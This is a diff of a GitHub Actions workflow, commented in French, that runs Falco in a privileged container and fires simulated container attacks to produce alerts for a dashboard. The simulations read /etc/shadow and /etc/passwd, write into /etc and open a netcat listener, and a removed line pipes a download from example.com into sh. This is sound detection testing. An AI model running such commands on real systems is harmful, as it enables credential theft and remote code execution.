@@ -151,63 +151,42 @@ jobs:
     steps:
       - uses: actions/checkout@v4
     
-      - name: Install Docker (pour simulations)
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y docker.io
-          sudo systemctl start docker
-          sudo usermod -aG docker $USER
-          sudo chmod 666 /var/run/docker.sock
+      - name: Pull Falco Official Image
+        run: docker pull falcosecurity/falco:latest
     
-      - name: Install Latest Falco + eBPF
+      - name: Run Falco Container + Simulations
         run: |
-          curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
-          echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | sudo tee /etc/apt/sources.list.d/falcosecurity.list
-          sudo apt-get update && sudo apt-get install -y falco
-          sudo falco --version  # Devrait être ~0.43.x
-    
-      - name: Start Falco eBPF (JSON output)
-        run: |
-          sudo falco \
-            -o json_output=true \
-            -o json_include_output_property=true \
-            -o engine.kind=ebpf \
-            -o ebpf.probe=modern \
-            > falco-results.json 2>&1 &
-          FALCO_PID=$!
-          echo "FALCO_PID=$FALCO_PID" >> $GITHUB_ENV
-          sleep 5  # Init eBPF
-    
-      - name: Simulate Attacks (Toutes catégories)
-        run: |
-          echo "=== Simulations pour Notice/Warning/Error/Critical ==="
-          # Notice: Shell in container
-          docker run --rm ubuntu cat /etc/shadow
-          # Warning: Write root
-          docker run --rm ubuntu touch /etc/test_malicious
-          # Error: Sensitive read
-          docker run --rm alpine cat /etc/passwd
-          # Critical: Suspicious process
-          docker run --rm alpine sh -c "wget -qO- http://example.com | sh"
-          sleep 10  # Capture events
-    
-      - name: Stop Falco & Parse
-        if: always()
-        run: |
-          sudo kill $FALCO_PID || true
-          sleep 2
-          # Nettoie logs, extrait JSON
-          grep '"output"' falco-results.json > falco-clean.json || touch falco-clean.json
-          wc -l falco-clean.json  # Compte alertes
-          echo "Alertes capturées : $(wc -l < falco-clean.json)"
+          # Start Falco monitoring HOST (privileged mounts)
+          docker run -d --name falco-monitor \
+            --privileged \
+            -v /proc:/host/proc:ro \
+            -v /sys/kernel/debug:/sys/kernel/debug:ro \
+            -v /var/run/docker.sock:/host/var/run/docker.sock \
+            -v /etc:/host/etc:ro \
+            falcosecurity/falco:latest \
+            falco -o json_output=true -o engine.kind=ebpf -o ebpf.probe=modern
+        
+          sleep 5  # Init
+         
+          # Simulations → Déclenche alertes
+          docker run --rm ubuntu:latest cat /etc/shadow     # Notice shell
+          docker run --rm ubuntu:latest touch /etc/malware  # Warning write
+          docker run --rm alpine:latest cat /etc/passwd     # Error sensitive
+          docker run --rm alpine:latest sh -c "nc -l -p 1234"  # Critical network
+          
+          sleep 10
+        
+        # Extract logs → falco-results.json pour dashboard
+          docker logs falco-monitor 2>&1 | grep '"output"' > falco-results.json
+          echo "Alertes: $(wc -l < falco-results.json)"
+          docker rm -f falco-monitor
     
       - name: Upload Falco Report
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: report-falco
-          path: falco*.json
-
+          path: falco-results.json
   # ══════════════════════════════════════════════════════════════════
   # PHASE 3a — Analyse IA (lit TOUS les rapports des 5 outils)
   # ═══════════════════════════════════════════════════════════════════
